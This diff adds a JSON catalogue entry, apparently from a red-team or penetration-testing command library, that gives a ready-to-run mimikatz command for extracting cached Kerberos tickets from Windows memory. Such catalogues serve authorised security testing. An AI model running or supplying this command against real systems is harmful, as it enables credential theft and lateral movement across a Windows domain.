@@ -1,0 +1,22 @@
+{
+  "id": "mimikatz-tickets",
+  "name": "Mimikatz Ticket Extraction",
+  "command": "./mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::tickets' 'exit'",
+  "description": "Extract cached Kerberos tickets",
+  "platform": "windows",
+  "requires": [
+    "shell"
+  ],
+  "protocols": [
+    "kerberos"
+  ],
+  "tags": [
+    "mimikatz",
+    "tickets",
+    "kerberos",
+    "extraction"
+  ],
+  "examples": [
+    "./mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::tickets' 'exit'"
+  ]
+}
